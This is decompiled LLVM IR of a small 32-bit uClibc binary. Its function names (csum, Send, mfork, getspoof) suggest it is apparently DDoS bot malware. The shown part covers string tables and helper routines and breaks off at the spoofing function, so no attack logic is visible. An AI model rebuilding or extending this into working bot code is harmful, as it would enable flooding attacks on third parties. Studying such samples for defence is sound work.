@global_var_806dbb3.815 = constant [38 x i8] c"%s: option `%s' requires an argument\0A\00"
@global_var_806dbd9.816 = constant [32 x i8] c"%s: unrecognized option `--%s'\0A\00"
@global_var_806dbf9.817 = constant [32 x i8] c"%s: unrecognized option `%c%s'\0A\00"
@global_var_806e71b.818 = constant i32 3091456
@global_var_806dc19.819 = constant [26 x i8] c"%s: illegal option -- %c\0A\00"
@global_var_806dc33.820 = constant [26 x i8] c"%s: invalid option -- %c\0A\00"
@global_var_806dc4d.821 = constant [39 x i8] c"%s: option requires an argument -- %c\0A\00"
@global_var_807c8c4.824 = global i32 0
@global_var_806f000.825 = global i32 -1
@global_var_8060c5f.826 = constant i32 -294069
@global_var_807c8d4.827 = local_unnamed_addr global i32 0
@global_var_807c8d8.828 = local_unnamed_addr global i32 0
@global_var_806decc.829 = constant [10 x i8] c"/dev/null\00"
@global_var_807c8c8.831 = local_unnamed_addr global i32 0
@global_var_8060e45.832 = constant i32 1928542531
@global_var_8060e69.833 = constant i32 1928542531
@global_var_807c900.834 = global i32 0
@global_var_807c8e0.836 = global i32 0
@global_var_807e52c.837 = global i32 0
@global_var_807e540.838 = global i32 0
@global_var_807e530.839 = global i32 0
@global_var_807e4a0.840 = global i32 0
@global_var_807ca44.841 = local_unnamed_addr global i32 0
@global_var_806e4f0.843 = constant [4 x i8] c"inf\00"
@global_var_806e4f3.848 = constant i32 1179535616
@global_var_806e500.849 = constant i32 2883630
@global_var_806e5f8.851 = constant [31 x i8] c"clntudp_create: out of memory\0A\00"
@global_var_8073fd8.852 = global i32 134621663
@global_var_807e520.853 = global i32 0
@global_var_807c9c8.854 = global i32 0
@global_var_807c9e4.856 = global i32 0
@global_var_806e640.862 = constant i32 0
@global_var_806e658.863 = constant i32 134626181
@global_var_806e664.864 = constant [36 x i8] c"bad auth_len gid %d str %d auth %d\0A\00"
@global_var_807c9fc.865 = global i32 0
@global_var_806e6bd.866 = constant i32 0
@global_var_806e688.867 = constant [27 x i8] c"xdr_string: out of memory\0A\00"
@global_var_806e6a3.868 = constant [26 x i8] c"xdr_bytes: out of memory\0A\00"
@global_var_806e6e0.869 = constant i32 134628592
@global_var_807ca00.870 = local_unnamed_addr global i32 0
@global_var_8073ff0.871 = global i32 0
@global_var_807ca04.872 = local_unnamed_addr global i32 0
@global_var_806e751.873 = constant i32 1868824690
@global_var_806e708.874 = constant [14 x i8] c"/etc/services\00"
@global_var_806e716.875 = constant [3 x i8] c"#\0A\00"
@global_var_806e719.876 = constant [3 x i8] c" \09\00"
@global_var_806e71c.877 = constant [3 x i8] c",/\00"
@global_var_807ca08.878 = global i32 0
@global_var_807e564.883 = local_unnamed_addr global i32 0
@global_var_806dae6.884 = constant i32 1885929518
@global_var_806e71f.885 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_806e730.886 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_806e748.887 = constant [11 x i8] c"nameserver\00"
@global_var_806e753.888 = constant [7 x i8] c"domain\00"
@global_var_806e75a.889 = constant [7 x i8] c"search\00"
@global_var_807e544.890 = global i32 0
@global_var_807e580.891 = global i32 0
@global_var_807ca38.892 = local_unnamed_addr global i32 0
@global_var_8065d62.893 = constant i32 -1592736637
@global_var_807ca3c.894 = local_unnamed_addr global i32 0
@global_var_807ca40.895 = local_unnamed_addr global i32 0
@global_var_807e600.896 = local_unnamed_addr global i32 0
@global_var_807e604.897 = local_unnamed_addr global i32 0
@global_var_806e764.898 = constant i32 134636940
@global_var_806e778.900 = constant [24 x i8] c"__get_myaddress: socket\00"
@global_var_806e790.901 = constant [53 x i8] c"__get_myaddress: ioctl (get interface configuration)\00"
@global_var_806e7c5.902 = constant [23 x i8] c"__get_myaddress: ioctl\00"
@global_var_806e7dc.907 = constant [24 x i8] c"Cannot register service\00"
@global_var_807ca4c.908 = local_unnamed_addr global i32 0
@global_var_806e804.909 = constant [26 x i8] c"xdr_array: out of memory\0A\00"
@global_var_806e81e.910 = constant [11 x i8] c"/etc/hosts\00"
@global_var_806e829.911 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_806ea40.912 = constant i32 0
@global_var_806ea44.913 = constant i32 0
@global_var_806eae0.914 = constant [13 x i8] c"RPC: Success\00"
@global_var_806e83b.915 = constant [26 x i8] c"RPC: (unknown error code)\00"
@global_var_806e855.916 = constant [5 x i8] c"%s: \00"
@global_var_806e85a.917 = constant [4 x i8] c" - \00"
@global_var_806e85e.919 = constant [13 x i8] c"; errno = %s\00"
@global_var_806e924.920 = constant i32 0
@global_var_806e960.921 = constant [18 x i8] c"Authentication OK\00"
@global_var_806e920.922 = constant i32 0
@global_var_806e893.923 = constant [9 x i8] c"; why = \00"
@global_var_806e89c.924 = constant [36 x i8] c"(unknown authentication error - %d)\00"
@global_var_806e86b.925 = constant [40 x i8] c"; low version = %lu, high version = %lu\00"
@global_var_806e8c0.926 = constant [21 x i8] c"; s1 = %lu, s2 = %lu\00"
@global_var_806f004.927 = global i32 134578845
@global_var_8074040.20 = local_unnamed_addr global i8 0
@global_var_8074080.27 = external global i8*
@global_var_8074070.28 = local_unnamed_addr global i8 0
@global_var_8074074.33 = external global i8*
@global_var_8074078.34 = local_unnamed_addr global i64 0
@2 = internal constant [21 x i8] c"\10>\07\08`>\07\08\C0=\07\08\10>\07\08\C0=\07\08\00"
@global_var_8073d6c = local_unnamed_addr global i8* getelementptr inbounds ([21 x i8], [21 x i8]* @2, i32 0, i32 0)
@3 = internal constant [17 x i8] c"`>\07\08\C0=\07\08\10>\07\08\C0=\07\08\00"
@global_var_8073d70 = local_unnamed_addr global i8* getelementptr inbounds ([17 x i8], [17 x i8]* @3, i32 0, i32 0)
@global_var_807cc80.96 = local_unnamed_addr global i64 0
@4 = internal constant [5 x i8] c"\03\03\0D3\00"
@global_var_80695c0.150 = constant i8* getelementptr inbounds ([5 x i8], [5 x i8]* @4, i32 0, i32 0)
@5 = internal constant [2 x i8] c"0\00"
@global_var_80698dd.176 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @5, i32 0, i32 0)
@global_var_807e0d0.200 = external local_unnamed_addr global i8*
@global_var_807dcdc.237 = external global i8*
@global_var_8074484.249 = local_unnamed_addr global i8 0
@global_var_8074485.250 = local_unnamed_addr global i8 0
@global_var_8074486.251 = local_unnamed_addr global i8 0
@global_var_8074487.252 = local_unnamed_addr global i8 0
@global_var_807e0f8.299 = external local_unnamed_addr global i8*
@global_var_8074077.628 = external local_unnamed_addr global i8*
@global_var_8074076.629 = external local_unnamed_addr global i8*
@global_var_8074075.630 = external global i8*
@global_var_806f060.631 = local_unnamed_addr global i64 578280306608439297
@global_var_8073a60.709 = local_unnamed_addr global i8 0
@global_var_806cc5e.734 = external constant i8*
@6 = internal constant [3 x i8] c"\01\06\00"
@global_var_806da67.751 = constant i8* getelementptr inbounds ([3 x i8], [3 x i8]* @6, i32 0, i32 0)
@global_var_807e120.767 = global i8 0
@global_var_807e480.783 = local_unnamed_addr global i8 0
@global_var_807c8a0.788 = local_unnamed_addr global i8 0
@global_var_807c8b5.803 = local_unnamed_addr global i8 0
@global_var_807c8b8.807 = external local_unnamed_addr global i8*
@global_var_807c8b7.808 = local_unnamed_addr global i8 0
@global_var_807c8b6.809 = local_unnamed_addr global i8 0
@global_var_8073fc0.822 = local_unnamed_addr global i8 63
@global_var_807c8b4.814 = local_unnamed_addr global i8 0
@global_var_807c8dc.830 = local_unnamed_addr global i8 0
@global_var_807c9e0.855 = local_unnamed_addr global i8 0
@global_var_807ca18.879 = local_unnamed_addr global i8 0
@global_var_807ca1c.880 = external global i8*
@global_var_807ca34.881 = local_unnamed_addr global i64 0
@global_var_8074008.882 = local_unnamed_addr global i16 1
@global_var_807ca48.899 = local_unnamed_addr global i16 0
@global_var_806915a.88 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 159611
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_8074040.20, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_806f044.22 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_806f044.22 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_806f044.22 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8074040.20, align 64
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_806f044.22 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8074040.20, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_806eca4.23 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_806f014.25, align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v4_8048166, i32* @ecx, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134566054, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134641352, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_8068aed.26 to i32)
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8048192 = load i32, i32* @ebp, align 4
  %v4_80481b727 = add i32 %arg2, -1
  %v9_80481b728 = sub i32 0, %arg2
  %v10_80481b729 = and i32 %arg2, %v9_80481b728
  %v11_80481b730 = icmp slt i32 %v10_80481b729, 0
  %v12_80481b731 = icmp eq i32 %v4_80481b727, 0
  %v13_80481b732 = icmp slt i32 %v4_80481b727, 0
  %v3_80481bb33 = icmp eq i1 %v13_80481b732, %v11_80481b730
  %v4_80481bb34 = icmp eq i1 %v12_80481b731, false
  %v5_80481bb35 = and i1 %v4_80481bb34, %v3_80481bb33
  br i1 %v5_80481bb35, label %dec_label_pc_80481a1, label %dec_label_pc_80481bd

dec_label_pc_80481a1:                             ; preds = %entry, %dec_label_pc_80481a1
  %stack_var_8.038 = phi i32 [ %v4_80481b3, %dec_label_pc_80481a1 ], [ %arg2, %entry ]
  %stack_var_4.037 = phi i16* [ %v23_80481af, %dec_label_pc_80481a1 ], [ %arg1, %entry ]
  %v3_80481ac36 = phi i16 [ %v6_80481ac, %dec_label_pc_80481a1 ], [ 0, %entry ]
  %v4_80481a1 = ptrtoint i16* %stack_var_4.037 to i32
  %v2_80481a4 = load i16, i16* %stack_var_4.037, align 2
  %v6_80481ac = add i16 %v2_80481a4, %v3_80481ac36
  %v5_80481af = add i32 %v4_80481a1, 2
  %v23_80481af = inttoptr i32 %v5_80481af to i16*
  %v4_80481b3 = add i32 %stack_var_8.038, -2
  %v4_80481b7 = add i32 %stack_var_8.038, -3
  %v9_80481b7 = sub i32 2, %stack_var_8.038
  %v10_80481b7 = and i32 %v4_80481b3, %v9_80481b7
  %v11_80481b7 = icmp slt i32 %v10_80481b7, 0
  %v12_80481b7 = icmp eq i32 %v4_80481b7, 0
  %v13_80481b7 = icmp slt i32 %v4_80481b7, 0
  %v3_80481bb = icmp eq i1 %v13_80481b7, %v11_80481b7
  %v4_80481bb = icmp eq i1 %v12_80481b7, false
  %v5_80481bb = and i1 %v4_80481bb, %v3_80481bb
  br i1 %v5_80481bb, label %dec_label_pc_80481a1, label %dec_label_pc_80481bd

dec_label_pc_80481bd:                             ; preds = %dec_label_pc_80481a1, %entry
  %v3_80481ac.lcssa = phi i16 [ 0, %entry ], [ %v6_80481ac, %dec_label_pc_80481a1 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_80481af, %dec_label_pc_80481a1 ]
  %v4_80481bb.lcssa = phi i1 [ %v4_80481bb34, %entry ], [ %v4_80481bb, %dec_label_pc_80481a1 ]
  br i1 %v4_80481bb.lcssa, label %dec_label_pc_80481df, label %dec_label_pc_80481c3

dec_label_pc_80481c3:                             ; preds = %dec_label_pc_80481bd
  %v4_80481cc = ptrtoint i16* %stack_var_4.0.lcssa to i32
  %v1_80481cf = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_80481cf = load i8, i8* %v1_80481cf, align 1
  %v3_80481cf = zext i8 %v2_80481cf to i32
  %v5_80481cf = and i32 %v4_80481cc, -256
  %v6_80481cf = or i32 %v3_80481cf, %v5_80481cf
  %v4_80481d315 = urem i32 %v6_80481cf, 65536
  %v4_80481dc47 = zext i16 %v3_80481ac.lcssa to i32
  %v6_80481dc = add nuw nsw i32 %v4_80481d315, %v4_80481dc47
  %v26_80481dc = trunc i32 %v6_80481dc to i16
  br label %dec_label_pc_80481df

dec_label_pc_80481df:                             ; preds = %dec_label_pc_80481bd, %dec_label_pc_80481c3
  %v3_80481e5 = phi i16 [ %v3_80481ac.lcssa, %dec_label_pc_80481bd ], [ %v26_80481dc, %dec_label_pc_80481c3 ]
  %v4_80481df = sext i16 %v3_80481e5 to i32
  %v2_80481e2 = sdiv i32 %v4_80481df, 65536
  %v2_80481e9 = add nsw i32 %v2_80481e2, %v4_80481df
  %sext3 = mul i32 %v2_80481e9, 65536
  %v2_80481f1 = ashr i32 %sext3, 31
  %v6_80481f41719 = add nsw i32 %v2_80481f1, %v2_80481e9
  %v4_80481f41618 = mul i32 %v6_80481f41719, 65536
  %v4_80481f726 = udiv i32 %v4_80481f41618, 65536
  %v1_80481fc = xor i32 %v4_80481f726, 65535
  store i32 %v0_8048192, i32* @ebp, align 4
  ret i32 %v1_80481fc

; uselistorder directives
  uselistorder i32 %v2_80481e9, { 1, 0 }
  uselistorder i32 %v4_80481df, { 1, 0 }
  uselistorder i16 %v3_80481ac.lcssa, { 1, 0 }
  uselistorder i32 %v4_80481b7, { 1, 0 }
  uselistorder i32 %v4_80481b3, { 1, 0 }
  uselistorder label %dec_label_pc_80481df, { 1, 0 }
  uselistorder label %dec_label_pc_80481a1, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048206 = load i32, i32* @ebx, align 4
  store i32 %v0_8048206, i32* %stack_var_-8, align 4
  %v4_804820a = ptrtoint i8* %arg1 to i32
  %v2_804820d = load i8, i8* %arg1, align 1
  %v12_8048215 = icmp eq i8 %v2_804820d, 42
  br i1 %v12_8048215, label %dec_label_pc_804823c, label %dec_label_pc_804821b

dec_label_pc_804821b:                             ; preds = %entry
  %v12_804821b = icmp eq i8 %v2_804820d, 63
  br i1 %v12_804821b, label %dec_label_pc_804828e, label %dec_label_pc_8048221

dec_label_pc_8048221:                             ; preds = %dec_label_pc_804821b
  %v4_8048221 = icmp eq i8 %v2_804820d, 0
  br i1 %v4_8048221, label %dec_label_pc_804822c, label %dec_label_pc_80482c8

dec_label_pc_804822c:                             ; preds = %dec_label_pc_8048221
  %v2_804822f = load i8, i8* %tmp14, align 1
  %v2_8048231 = sext i8 %v2_804822f to i32
  br label %dec_label_pc_8048325

dec_label_pc_804823c:                             ; preds = %entry
  %v1_804823f = add i32 %v4_804820a, 1
  %v5_8048246 = inttoptr i32 %v1_804823f to i8*
  %v5_8048247 = call i32 @strwildmatch(i8* %v5_8048246, i32 %arg2)
  %v1_804824f = icmp eq i32 %v5_8048247, 0
  br i1 %v1_804824f, label %dec_label_pc_804827c, label %dec_label_pc_8048253

dec_label_pc_8048253:                             ; preds = %dec_label_pc_804823c
  %v2_8048256 = load i8, i8* %tmp14, align 1
  %v4_8048258 = icmp eq i8 %v2_8048256, 0
  br i1 %v4_8048258, label %dec_label_pc_8048283, label %dec_label_pc_804825c

dec_label_pc_804825c:                             ; preds = %dec_label_pc_8048253
  %v1_804825f = add i32 %arg2, 1
  %v5_8048267 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_804825f)
  %v1_804826f = icmp eq i32 %v5_8048267, 0
  br i1 %v1_804826f, label %dec_label_pc_804827c, label %dec_label_pc_8048283

dec_label_pc_804827c:                             ; preds = %dec_label_pc_804825c, %dec_label_pc_804823c
  br label %dec_label_pc_8048283

dec_label_pc_8048283:                             ; preds = %dec_label_pc_8048253, %dec_label_pc_804825c, %dec_label_pc_804827c
  %storemerge8 = phi i32 [ 0, %dec_label_pc_804827c ], [ 1, %dec_label_pc_804825c ], [ 1, %dec_label_pc_8048253 ]
  br label %dec_label_pc_8048325

dec_label_pc_804828e:                             ; preds = %dec_label_pc_804821b
  %v2_8048291 = load i8, i8* %tmp14, align 1
  %v4_8048293 = icmp eq i8 %v2_8048291, 0
  br i1 %v4_8048293, label %dec_label_pc_80482c0, label %dec_label_pc_8048297

dec_label_pc_8048297:                             ; preds = %dec_label_pc_804828e
  %v1_804829a = add i32 %arg2, 1
  %v1_804829e = add i32 %v4_804820a, 1
  %v5_80482a3 = inttoptr i32 %v1_804829e to i8*
  %v5_80482a4 = call i32 @strwildmatch(i8* %v5_80482a3, i32 %v1_804829a)
  %v1_80482ac = icmp ne i32 %v5_80482a4, 0
  %. = zext i1 %v1_80482ac to i32
  br label %dec_label_pc_80482c0

dec_label_pc_80482c0:                             ; preds = %dec_label_pc_8048297, %dec_label_pc_804828e
  %storemerge5 = phi i32 [ 1, %dec_label_pc_804828e ], [ %., %dec_label_pc_8048297 ]
  br label %dec_label_pc_8048325

dec_label_pc_80482c8:                             ; preds = %dec_label_pc_8048221
  %v2_80482cb = load i8, i8* %arg1, align 1
  %v2_80482cd = sext i8 %v2_80482cb to i32
  %v2_80482d4 = call i32 @__GI_toupper(i32 %v2_80482cd)
  store i32 %v2_80482d4, i32* @ebx, align 4
  %v2_80482e1 = load i8, i8* %tmp14, align 1
  %v2_80482e3 = sext i8 %v2_80482e1 to i32
  %v2_80482ea = call i32 @__GI_toupper(i32 %v2_80482e3)
  %v0_80482f2 = load i32, i32* @ebx, align 4
  %v12_80482f2 = icmp eq i32 %v0_80482f2, %v2_80482ea
  %v1_80482f4 = icmp eq i1 %v12_80482f2, false
  br i1 %v1_80482f4, label %dec_label_pc_804831f, label %dec_label_pc_80482f6

dec_label_pc_80482f6:                             ; preds = %dec_label_pc_80482c8
  %v1_80482f9 = add i32 %arg2, 1
  %v1_80482fd = add i32 %v4_804820a, 1
  %v5_8048302 = inttoptr i32 %v1_80482fd to i8*
  %v5_8048303 = call i32 @strwildmatch(i8* %v5_8048302, i32 %v1_80482f9)
  %v1_804830b = icmp ne i32 %v5_8048303, 0
  %.9 = zext i1 %v1_804830b to i32
  br label %dec_label_pc_804831f

dec_label_pc_804831f:                             ; preds = %dec_label_pc_80482f6, %dec_label_pc_80482c8
  %storemerge = phi i32 [ 1, %dec_label_pc_80482c8 ], [ %.9, %dec_label_pc_80482f6 ]
  br label %dec_label_pc_8048325

dec_label_pc_8048325:                             ; preds = %dec_label_pc_80482c0, %dec_label_pc_8048283, %dec_label_pc_804822c, %dec_label_pc_804831f
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_8048283 ], [ %storemerge5, %dec_label_pc_80482c0 ], [ %v2_8048231, %dec_label_pc_804822c ], [ %storemerge, %dec_label_pc_804831f ]
  %v3_8048328 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048328, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_804820d, { 2, 0, 1 }
  uselistorder i32 %v4_804820a, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048325, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048283, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v0_8048330 = load i32, i32* @edi, align 4
  %v4_8048337 = ptrtoint i32* %stack_var_12 to i32
  %v5_8048349 = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_8074080.27 to i32), i32 %arg2, i32 %v4_8048337)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_8074080.27 to i32), i32* @edi, align 4
  %v3_8048364 = call i32 @_strlen(i8* bitcast (i8** @global_var_8074080.27 to i8*))
  %v4_8048364 = mul i32 %v3_8048364, -1
  %v5_8048364 = add i32 %v4_8048364, -2
  store i32 %v5_8048364, i32* @ecx, align 4
  %v1_804836a = sub i32 0, %v4_8048364
  %v5_8048377 = call i32 @write(i32 %arg1, i32 ptrtoint (i8** @global_var_8074080.27 to i32), i32 %v1_804836a)
  store i32 %v0_8048330, i32* @edi, align 4
  ret i32 %v5_8048377
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_804838a = load i8, i8* @global_var_8074070.28, align 16
  %v10_804838f = icmp eq i8 %v0_804838a, 1
  %v1_8048391 = icmp eq i1 %v10_804838f, false
  br i1 %v1_8048391, label %dec_label_pc_80483b8, label %dec_label_pc_8048393

dec_label_pc_8048393:                             ; preds = %entry
  %v0_8048393 = load i32, i32* @global_var_807cb70.29, align 16
  %v3_80483a4 = call i32 @Send(i32 %v0_8048393, i32 ptrtoint ([30 x i8]* @global_var_8068af4.30 to i32))
  br label %dec_label_pc_804845e

dec_label_pc_80483b8:                             ; preds = %entry
  %v1_80483b8 = call i32 @fork(i32 %tmp4)
  %v4_80483c0 = icmp eq i32 %v1_80483b8, 0
  %v1_80483c4 = icmp eq i1 %v4_80483c0, false
  br i1 %v1_80483c4, label %dec_label_pc_80483d1, label %dec_label_pc_80483c6

dec_label_pc_80483c6:                             ; preds = %dec_label_pc_80483b8
  br label %dec_label_pc_804845e

dec_label_pc_80483d1:                             ; preds = %dec_label_pc_80483b8
  %v0_80483d1 = load i32, i32* @global_var_807407c.31, align 4
  %v1_80483d6 = add i32 %v0_80483d1, 1
  store i32 %v1_80483d6, i32* @global_var_807407c.31, align 4
  %v2_80483e1 = mul i32 %v1_80483d6, 4
  %v1_80483e4 = add i32 %v2_80483e1, 4
  %v1_80483eb = call i32 @malloc(i32 %v1_80483e4)
  %v0_804842113 = load i32, i32* @global_var_807407c.31, align 4
  %v6_804842a15 = icmp eq i32 %v0_804842113, 1
  br i1 %v6_804842a15, label %dec_label_pc_804842c, label %dec_label_pc_80483ff

dec_label_pc_80483ff:                             ; preds = %dec_label_pc_80483d1, %dec_label_pc_80483ff
  %storemerge16 = phi i32 [ %v4_804841e, %dec_label_pc_80483ff ], [ 0, %dec_label_pc_80483d1 ]
  %v2_8048402 = mul i32 %storemerge16, 4
  %v5_8048407 = add i32 %v2_8048402, %v1_80483eb
  store i32 %v5_8048407, i32* @ecx, align 4
  %v0_8048412 = load i32, i32* @global_var_807e0fc.32, align 4
  %v2_8048417 = add i32 %v0_8048412, %v2_8048402
  %v1_804841a = inttoptr i32 %v2_8048417 to i32*
  %v2_804841a = load i32, i32* %v1_804841a, align 4
  %v2_804841c = inttoptr i32 %v5_8048407 to i32*
  store i32 %v2_804841a, i32* %v2_804841c, align 4
  %v4_804841e = add i32 %storemerge16, 1
  %v0_8048421 = load i32, i32* @global_var_807407c.31, align 4
  %v1_8048426 = add i32 %v0_8048421, -1
  %v6_804842a = icmp ugt i32 %v1_8048426, %v4_804841e
  br i1 %v6_804842a, label %dec_label_pc_80483ff, label %dec_label_pc_804842c

dec_label_pc_804842c:                             ; preds = %dec_label_pc_80483ff, %dec_label_pc_80483d1
  %v0_8048421.lcssa = phi i32 [ %v0_804842113, %dec_label_pc_80483d1 ], [ %v0_8048421, %dec_label_pc_80483ff ]
  %v2_8048431 = mul i32 %v0_8048421.lcssa, 4
  %v5_8048434 = add i32 %v1_80483eb, -4
  %v1_8048437 = add i32 %v5_8048434, %v2_8048431
  store i32 %v1_8048437, i32* @edx, align 4
  %v2_804843d = inttoptr i32 %v1_8048437 to i32*
  store i32 %v1_80483b8, i32* %v2_804843d, align 4
  %v0_804843f = load i32, i32* @global_var_807e0fc.32, align 4
  %v1_8048448 = call i32 @free(i32 %v0_804843f)
  store i32 %v1_80483eb, i32* @global_var_807e0fc.32, align 4
  br label %dec_label_pc_804845e

dec_label_pc_804845e:                             ; preds = %dec_label_pc_80483c6, %dec_label_pc_8048393, %dec_label_pc_804842c
  %stack_var_-24.0 = phi i32 [ %v1_80483b8, %dec_label_pc_804842c ], [ %v1_80483b8, %dec_label_pc_80483c6 ], [ 1, %dec_label_pc_8048393 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_804841e, { 1, 0 }
  uselistorder i32 %v2_8048402, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v0_804842113, { 1, 0 }
  uselistorder i32 %v1_80483eb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804845e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80483ff, { 1, 0 }
}

define i32 @getspoof(i32 %arg1) local_unnamed_addr {
